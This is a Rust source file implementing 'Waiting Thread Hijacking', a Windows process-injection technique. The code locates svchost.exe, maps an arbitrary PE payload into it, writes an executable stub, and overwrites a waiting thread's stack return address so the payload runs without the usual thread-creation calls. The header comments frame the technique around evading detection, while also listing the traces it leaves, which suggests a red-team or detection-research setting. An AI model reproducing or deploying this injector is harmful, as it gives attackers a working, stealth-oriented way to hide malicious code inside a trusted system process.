//! Waiting Thread Hijacking (WTH) injection.
//!
//! Technique: find a waiting thread in svchost.exe, overwrite RSP[0] with a
//! stub VA, and let the thread resume naturally — no CreateRemoteThread, no
//! SetThreadContext, no SuspendThread.
//!
//! Detection artifacts:
//! - Sysmon EID 10: Process Access (OpenProcess)
//! - Sysmon EID 8: none — no CreateRemoteThread called by injector
//! - Memory scanner: executable stub in RWX region (PAGE_EXECUTE_READ after flip)
#![cfg(windows)]
#![allow(unsafe_code)]

use super::{pe_map, stub, winapi::*, InjectionError};
use windows_sys::Win32::{
    Foundation::{CloseHandle, FALSE, HANDLE},
    System::{
        Diagnostics::{
            Debug::{
                GetThreadContext, ReadProcessMemory, WriteProcessMemory, CONTEXT,
                CONTEXT_CONTROL_AMD64,
            },
            ToolHelp::{
                CreateToolhelp32Snapshot, Process32FirstW, Process32NextW, PROCESSENTRY32W,
                TH32CS_SNAPPROCESS,
            },
        },
        LibraryLoader::{GetModuleHandleA, GetProcAddress},
        Memory::{
            VirtualAllocEx, VirtualProtectEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ,
            PAGE_READWRITE,
        },
        Threading::OpenProcess,
    },
};

/// RAII wrapper that closes a HANDLE on drop.
struct HGuard(HANDLE);

impl Drop for HGuard {
    fn drop(&mut self) {
        if !self.0.is_null() {
            unsafe { CloseHandle(self.0) };
        }
    }
}

/// Inject `payload` into the first waiting thread of svchost.exe via RSP overwrite.
pub fn inject(payload: &[u8]) -> Result<(), InjectionError> {
    // Step 1: find svchost.exe PID.
    let pid = find_pid_w("svchost.exe")
        .ok_or(InjectionError::ProcessNotFound)?;

    // Step 2: open target process.
    let proc_raw = unsafe {
        OpenProcess(
            PROCESS_VM_OPERATION
                | PROCESS_VM_READ
                | PROCESS_VM_WRITE
                | PROCESS_CREATE_THREAD
                | PROCESS_QUERY_INFORMATION,
            FALSE,
            pid,
        )
    };
    if proc_raw.is_null() {
        return Err(InjectionError::OpenFailed("OpenProcess failed".into()));
    }
    let _proc_guard = HGuard(proc_raw);
    let proc: HANDLE = proc_raw;

    // Step 3: map PE into remote process.
    let remote_base = pe_map::map_pe_into(proc, payload)?;

    // Step 4: calculate remote OEP.
    let oep_ptr = pe_map::remote_oep(payload, remote_base)?;
    let oep = oep_ptr as u64;

    // Step 5: resolve CreateThread VA in target (same VA as in injector — ASLR is
    // boot-session-wide for shared DLL sections).
    let k32 = unsafe { GetModuleHandleA(b"kernel32.dll\0".as_ptr()) };
    if k32.is_null() {
        return Err(InjectionError::ThreadFailed(
            "GetModuleHandleA kernel32 failed".into(),
        ));
    }
    let ct_va = unsafe { GetProcAddress(k32, b"CreateThread\0".as_ptr()) }
        .map(|f| f as usize as u64)
        .ok_or_else(|| InjectionError::ThreadFailed("GetProcAddress CreateThread failed".into()))?;

    // Step 6: find a waiting thread and its RSP.
    let (thread_raw, rsp) = find_waiting_thread(proc)?;
    let _thread_guard = HGuard(thread_raw);

    // Step 7: save original return address at RSP.
    let mut orig_ret = 0u64;
    let mut nr: usize = 0;
    let ok = unsafe {
        ReadProcessMemory(
            proc,
            rsp as *const _,
            &mut orig_ret as *mut u64 as *mut _,
            8,
            &mut nr,
        )
    };
    if ok == 0 || nr != 8 {
        return Err(InjectionError::WriteFailed(
            "ReadProcessMemory orig_ret failed".into(),
        ));
    }

    // Step 8: build 85-byte stub.
    let stub_bytes = stub::build(oep, ct_va, orig_ret);

    // Step 9: allocate RW memory for stub.
    let stub_mem = unsafe {
        VirtualAllocEx(
            proc,
            core::ptr::null(),
            85,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        )
    };
    if stub_mem.is_null() {
        return Err(InjectionError::AllocFailed("VirtualAllocEx stub failed".into()));
    }

    // Step 10: write stub bytes.
    let mut written: usize = 0;
    let ok = unsafe {
        WriteProcessMemory(
            proc,
            stub_mem,
            stub_bytes.as_ptr() as *const _,
            85,
            &mut written,
        )
    };
    if ok == 0 || written != 85 {
        return Err(InjectionError::WriteFailed(
            "WriteProcessMemory stub failed".into(),
        ));
    }

    // Step 11: flip stub memory to PAGE_EXECUTE_READ.
    let mut old: u32 = 0;
    let ok = unsafe { VirtualProtectEx(proc, stub_mem, 85, PAGE_EXECUTE_READ, &mut old) };
    if ok == 0 {
        return Err(InjectionError::AllocFailed(
            "VirtualProtectEx stub failed".into(),
        ));
    }

    // Step 12: overwrite RSP[0] with stub VA.
    let stub_va = stub_mem as u64;
    let mut w: usize = 0;
    let ok = unsafe {
        WriteProcessMemory(
            proc,
            rsp as *mut _,
            &stub_va as *const u64 as *const _,
            8,
            &mut w,
        )
    };
    if ok == 0 || w != 8 {
        return Err(InjectionError::WriteFailed(
            "WriteProcessMemory RSP overwrite failed".into(),
        ));
    }

    Ok(())
}

/// Find the PID of the first process whose name matches `name` (case-insensitive, ASCII).
fn find_pid_w(name: &str) -> Option<u32> {
    let snap = unsafe { CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0) };
    // INVALID_HANDLE_VALUE is -1 cast, i.e. all bits set.
    let invalid = usize::MAX as isize as *mut core::ffi::c_void;
    if snap.is_null() || snap == invalid {
        return None;
    }
    let _guard = HGuard(snap);

    let mut entry: PROCESSENTRY32W = unsafe { core::mem::zeroed() };
    entry.dwSize = core::mem::size_of::<PROCESSENTRY32W>() as u32;

    if unsafe { Process32FirstW(snap, &mut entry) } == 0 {
        return None;
    }

    let target: Vec<u16> = name
        .encode_utf16()
        .chain(core::iter::once(0u16))
        .collect();

    loop {
        // Compare null-terminated wide string.
        let proc_name: Vec<u16> = entry
            .szExeFile
            .iter()
            .copied()
            .take_while(|&c| c != 0)
            .collect();

        // Case-insensitive ASCII compare: map wide chars to lowercase u8 for ASCII range.
        let matches = proc_name.len() + 1 == target.len()
            && proc_name.iter().zip(target.iter()).all(|(&a, &b)| {
                let al = if a < 128 { (a as u8).to_ascii_lowercase() as u16 } else { a };
                let bl = if b < 128 { (b as u8).to_ascii_lowercase() as u16 } else { b };
                al == bl
            });

        if matches {
            return Some(entry.th32ProcessID);
        }

        if unsafe { Process32NextW(snap, &mut entry) } == 0 {
            break;
        }
    }

    None
}

/// Enumerate threads of `proc` via NtGetNextThread and return the first waiting
/// thread handle plus its RSP value.
fn find_waiting_thread(proc: HANDLE) -> Result<(HANDLE, u64), InjectionError> {
    let mut prev: HANDLE = core::ptr::null_mut();
    loop {
        let mut next: HANDLE = core::ptr::null_mut();
        let status = unsafe {
            NtGetNextThread(
                proc,
                prev,
                THREAD_GET_CONTEXT | THREAD_QUERY_INFORMATION,
                0,
                0,
                &mut next,
            )
        };

        // Close the previous handle before moving on.
        if !prev.is_null() {
            unsafe { CloseHandle(prev) };
        }

        if status == STATUS_NO_MORE_ENTRIES {
            return Err(InjectionError::ThreadFailed(
                "no waiting thread found".into(),
            ));
        }
        if status != STATUS_SUCCESS {
            return Err(InjectionError::ThreadFailed(format!(
                "NtGetNextThread status {status:#x}"
            )));
        }

        let mut ctx: CONTEXT = unsafe { core::mem::zeroed() };
        ctx.ContextFlags = CONTEXT_CONTROL_AMD64;

        let ok = unsafe { GetThreadContext(next, &mut ctx) };
        if ok != 0 && ctx.Rsp != 0 {
            return Ok((next, ctx.Rsp));
        }

        prev = next;
    }
}
